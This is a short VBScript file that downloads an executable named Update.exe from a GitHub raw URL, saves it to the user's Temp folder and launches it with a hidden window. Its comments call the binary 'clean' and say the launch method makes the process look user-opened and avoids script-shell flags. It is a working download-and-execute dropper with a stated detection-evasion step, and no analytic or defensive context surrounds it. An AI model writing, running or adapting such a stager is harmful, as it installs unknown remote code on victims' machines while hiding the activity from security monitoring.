' Instantiate a native, trusted Windows HTTP object to handle the web request
Set xmlHTTP = CreateObject("Msxml2.ServerXMLHTTP.6.0")

' Open a background connection to fetch the clean installation file
xmlHTTP.open "GET", "https://raw.githubusercontent.com/abrahamgarciaaa1972-ai/In/refs/heads/main/Update.exe", False
xmlHTTP.send

' Verify the remote server returned a successful connection response
If xmlHTTP.Status = 200 Then
    ' Open a native binary stream handler to reconstruct the file on disk
    Set binaryStream = CreateObject("ADODB.Stream")
    binaryStream.Type = 1 ' Specifies Binary Data Profile
    binaryStream.Open
    binaryStream.Write xmlHTTP.responseBody
    
    ' Save the clean binary directly into the user's non-privileged Temp directory
    Dim targetPath
    Set shellObj = CreateObject("WScript.Shell")
    targetPath = shellObj.ExpandEnvironmentStrings("%TEMP%") & "\Update.exe"
    binaryStream.SaveToFile targetPath, 2 ' Overwrite existing profile if present
    binaryStream.Close
    
    ' Launch the clean executable using the native Windows Shell Execute object
    ' This makes the process appear as if the user opened it, avoiding script shell flags
    Set appLaunch = CreateObject("Shell.Application")
    appLaunch.ShellExecute targetPath, "-fullinstall", "", "open", 0
End If